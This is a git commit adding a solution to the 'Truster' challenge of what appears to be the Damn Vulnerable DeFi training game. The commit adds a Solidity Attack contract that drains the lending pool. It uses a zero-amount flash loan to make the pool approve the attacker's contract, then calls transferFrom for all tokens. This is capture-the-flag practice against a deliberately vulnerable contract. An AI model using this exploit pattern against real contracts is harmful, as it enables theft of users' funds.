720c02ffbfe1191798df96b1cca9a6d2994ea435
Stefano Candori <stefano.candori@helloprima.com>
2025-12-31 10:51:16 +0000

    truster done!

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,11 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Deploy the attack contract
+        Attack attackContract = new Attack(pool, token, player, recovery);
+
+        // Execute the attack
+        attackContract.attack();
     }
 
     /**
@@ -63,6 +67,46 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Attack {
+    TrusterLenderPool public pool;
+    DamnValuableToken public token;
+    address public player;
+    address public recovery;
+
+    constructor(
+        TrusterLenderPool _pool,
+        DamnValuableToken _token,
+        address _player,
+        address _recovery
+    ) {
+        pool = _pool;
+        token = _token;
+        player = _player;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // Crafting the payload to approve the player to spend the pool's tokens
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            1_000_000e18
+        );
+
+        // Taking a flash loan of 0 tokens to execute the approve function
+        pool.flashLoan(0, address(this), address(pool.token()), data);
+
+        // Now that the player is approved, transfer all tokens from the pool to the recovery account
+        token.transferFrom(address(pool), address(this), 1_000_000e18);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
